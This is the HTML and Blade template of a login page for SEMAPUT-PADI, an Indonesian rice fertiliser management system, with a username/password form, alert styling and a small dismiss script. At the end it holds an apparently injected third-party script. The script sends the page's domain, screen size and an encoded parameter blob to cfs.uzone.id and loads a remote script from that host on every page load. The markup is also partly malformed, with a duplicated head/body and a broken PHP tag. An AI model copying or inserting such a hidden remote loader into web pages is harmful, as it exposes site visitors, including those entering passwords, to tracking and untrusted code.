<!DOCTYPE html>
<html>
<head>
	<title>Selamat datang | SEMAPUT</title>
	<link rel="stylesheet" type="text/css" href="{{ URL::asset('/css.css') }}">
	<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.2.6/semantic.min.css">
</head>

<body>

	
	<div class="transparan1"><img id="background" src="image/background.jpg"></div>
	<div id="atas-home">
		<div class="ui grid">
		  <div class="six wide column">
		  			<img class="ilogo" src="image/logosemaputpadi.png">
		  </div>
		  <div class="seven wide column">
		  			<p><div class="judul" ><span class="ku">SEMAPUT - PADI</span> </div></p>
					<p><div class="subjudul"><span class="ku2"> Sistem Manajemen Pupuk Tanaman - Padi</span></div></p>
		  </div>
		  <div class="three wide column">
		   </div>
		</div>
	</div>

<div class="isi">
	<div class="form-login">
		<form class="login"  action="{{URL('semaput')}}" method="POST">
		{{csrf_field()}}
			<div class="login-item">
				<span class="judullogin">
					Login
				</span>	
			</div>
			<div class="login-item">
			@if(Session::has('alertUsername'))
				<div class="alert">
				  <span class="closebtn">&times;</span>  
				     <span>{{ Session::get('alertUsername') }}</span>
				</div>
				@endif
				<div class="ui fluid left icon input">
						  <input type="text" name="username" placeholder="Username" required="">
						  <i class="user icon"></i>
						</div>
						</div>
		    <div class="login-item">
		    @if(Session::has('alertPassword'))
		    	<div class="alert">
				  <span class="closebtn">&times;</span>  
				  	<span>{{ Session::get('alertPassword') }}</span>
				  	<?Session::forget('alertPassword') ;?>
				</div>
				@endif
				<div class="ui fluid left icon input">
						  <input type="password" name="password" placeholder="Password" required="">
						  <i class="lock icon"></i>
						</div>
		    </div>
		    <div class="login-item">
		    	<button class="fluid ui teal button" style="height: 50px;">Login</button>
		    </div>
  		</form>
	</div>
</div>
<footer>
      <div class="versi">
        Recently, v0.3
      </div>
      <div class="team">
        by : Yovanka Adam, Anne Rufaedah, Riya Alvianita, Reny Rizqiyatus S.
      </div>
      <div class="for">
        pplagro2016
      </div>
	</footer>
	<style type="text/css">
.alert {
	position: relative;
    padding: 20px;
    background-color: #f44336;
    color: white;
    opacity: 1;
    transition: opacity 0.6s;
}

.closebtn {
	position: relative;
    margin-left: 15px;
    color: white;
    font-weight: bold;
    float: right;
    font-size: 22px;
    line-height: 20px;
    cursor: pointer;
    transition: 0.3s;
}

.closebtn:hover {
	position: relative;
    color: black;
}
</style>
</head>
<body>




<script>
var close = document.getElementsByClassName("closebtn");
var i;

for (i = 0; i < close.length; i++) {
    close[i].onclick = function(){
        var div = this.parentElement;
        div.style.opacity = "0";
        setTimeout(function(){ div.style.display = "none"; }, 600);
    }
}
</script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "¶ms=" + "4TtHaUQnUEiP6K%2fc5C582H6x5iDAuv2Bjw%2bjvmqL3WSUrnnA9180Qh7l5ub%2b6gKdeKDVrP0uqpCOyvMajPCftijUdV%2fKOyC56iSeJuQbNERn03ueP6akmiCN0FwUWY9hdgYb%2bexWEj8bGL9MVUSgA%2fwn8DUSoLmJIO2bmQtbBBXJVTirf383vYTCoOZjwnjzBiNM8dZUjrn5LWWc%2f6gNAHdYD7TsZ4J11bszVMoppkIlRzE0jDKF%2fiB%2fa6e4A1%2fIwE6JZ%2fE%2frkIglagugD6Qdek3JrBkMUB1UN9F4AYKQv4BPQovkaz3LAzqOfACZ9DHahl6GXZyjJC%2ftKc2%2fLepJrIgUwbuZBmpEOIoUyeXkfOZHM90wiSGLYi%2bXTcM17Z%2bXK%2fY0boanVr0YxFMgI8okA%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
</body>
</html>